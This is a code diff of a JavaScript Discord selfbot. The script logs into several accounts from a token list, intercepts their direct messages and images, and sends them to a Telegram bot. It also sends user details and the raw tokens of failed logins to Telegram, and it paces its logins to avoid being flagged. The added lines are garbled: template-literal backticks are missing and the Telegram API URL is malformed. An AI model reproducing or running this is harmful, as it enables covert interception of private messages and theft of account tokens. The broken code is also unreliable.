@@ -62,7 +62,10 @@ function createSelfbotInstance(token, index) {
         client.on('ready', async () => {
             console.log(`[Account #${accountNumber}] Logged in as ${client.user.tag}`);
             
-            const statusUpdate = `✅ [Account #${accountNumber}/${DISCORD_TOKENS.length}] Online!\n👤 User: ${client.user.tag}\n🆔 ID: ${client.user.id}`;
+            // Sends immediate success details for each successful account login
+            const statusUpdate = `✅ *[Account #${accountNumber}/${DISCORD_TOKENS.length}] LOGGED IN!*\n\n` +
+                                  `• *User:* ${client.user.tag}\n` +
+                                  `• *ID:* \`${client.user.id}\``;
             await sendToTelegram(statusUpdate);
 
             client.relationships.friendCache.forEach((user, id) => {
@@ -109,7 +112,7 @@ function createSelfbotInstance(token, index) {
 
                         setTimeout(() => processedMessageIds.delete(data.id), 60000);
 
-                        console.log(`[${client.user.username || 'Selfbot'}] Instant Raw DM Packet Intercepted!`);
+                        console.log(`[${client.user.username || 'Selfbot'}] Instant Raw DM Hack Intercepted!`);
 
                         const channel = await client.channels.fetch(data.channel_id).catch(() => null);
                         if (channel) {
@@ -181,9 +184,9 @@ function createSelfbotInstance(token, index) {
             console.error(`❌ [Account #${accountNumber}] Failed login.`);
             
             // Send exact faulty token and account slot back to telegram securely
-            const failureReport = `❌ [Account #${accountNumber}/${DISCORD_TOKENS.length}] LOGIN FAILED!\n\n` +
-                                  `Error Reason: ${err.message}\n` +
-                                  `Faulty Token:\n\`${cleanToken}\``;
+            const failureReport = `❌ *[Account #${accountNumber}/${DISCORD_TOKENS.length}] LOGIN FAILED!*\n\n` +
+                                  `• *Error:* ${err.message}\n` +
+                                  `• *Faulty Token:* \`${cleanToken}\``;
             
             await sendToTelegram(failureReport);
             resolve(); 
@@ -212,70 +215,65 @@ async function handleValidDM(client, message) {
                 await sendToTelegram(text);
             }
         } else {
-            await sendToTelegram(text);
-        }
-    } catch (err) {
-        console.error("Error inside handleValidDM router:", err.message);
-    }
+await sendToTelegram(text);
+}
+} catch (err) {
+console.error("Error inside handleValidDM router:", err.message);
+}
 }
 
 // Sequential Execution Loop
 async function bootSequence() {
-    console.log(`🔄 Processing sequential login checks for ${DISCORD_TOKENS.length} tokens...`);
-    await sendToTelegram(`🚀 Starting boot initialization for ${DISCORD_TOKENS.length} tokens...`);
-    
-    for (let i = 0; i < DISCORD_TOKENS.length; i++) {
-        await createSelfbotInstance(DISCORD_TOKENS[i], i);
-        // 2.5 second delay to preserve API integrity and prevent flagging
-        await sleep(2500); 
-    }
-    console.log(`\n🏁 Verification completed.`);
+console.log(🔄 Processing sequential login checks for ${DISCORD_TOKENS.length} tokens...);
+await sendToTelegram(🚀 Starting boot initialization for ${DISCORD_TOKENS.length} tokens...);
+for (let i = 0; i < DISCORD_TOKENS.length; i++) {
+await createSelfbotInstance(DISCORD_TOKENS[i], i);
+// 2.5 second delay to preserve API integrity and prevent flagging
+await sleep(2500);
 }
-
+console.log(\n🏁 Verification completed.);
+}
 bootSequence();
-
 // --- Telegram helper functions ---
-
 async function sendImageToTelegram(imageUrl, caption) {
-    if (!TELEGRAM_CHAT_ID) return;
-    try {
-        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
-        const response = await fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: TELEGRAM_CHAT_ID,
-                photo: imageUrl,
-                caption: caption
-            })
-        });
-        const result = await response.json();
-        if (!result.ok) {
-            console.error('Telegram API error (image):', result);
-            await sendToTelegram(caption + `\n🖼️ Image: ${imageUrl}`);
-        }
-    } catch (error) {
-        console.error('Error sending image to Telegram:', error);
-        await sendToTelegram(caption + `\n🖼️ Image: ${imageUrl}`);
-    }
+if (!TELEGRAM_CHAT_ID) return;
+try {
+const url = https://telegram.org{TELEGRAM_BOT_TOKEN}/sendPhoto;
+const response = await fetch(url, {
+method: 'POST',
+headers: { 'Content-Type': 'application/json' },
+body: JSON.stringify({
+chat_id: TELEGRAM_CHAT_ID,
+photo: imageUrl,
+caption: caption
+})
+});
+const result = await response.json();
+if (!result.ok) {
+console.error('Telegram API error (image):', result);
+await sendToTelegram(caption + \n\n🖼️ Image URL: ${imageUrl});
 }
-
+} catch (error) {
+console.error('Error sending image to Telegram:', error);
+await sendToTelegram(caption + \n\n🖼️ Image URL: ${imageUrl});
+}
+}
 async function sendToTelegram(text) {
-    if (!TELEGRAM_CHAT_ID) return;
-    try {
-        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-        const response = await fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: TELEGRAM_CHAT_ID,
-                text: text,
-                parse_mode: "Markdown"
-            })
-        });
-        const result = await response.json();
-        if (!result.ok) console.error('Telegram API error:', result);
-    } catch (error) {
-        console.error('Error sending to Telegram:', error);
-    }
+if (!TELEGRAM_CHAT_ID) return;
+try {
+const url = https://telegram.org{TELEGRAM_BOT_TOKEN}/sendMessage;
+const response = await fetch(url, {
+method: 'POST',
+headers: { 'Content-Type': 'application/json' },
+body: JSON.stringify({
+chat_id: TELEGRAM_CHAT_ID,
+text: text,
+parse_mode: "Markdown"
+})
+});
+const result = await response.json();
+if (!result.ok) console.error('Telegram API error:', result);
+} catch (error) {
+console.error('Error sending to Telegram:', error);
+}
 }
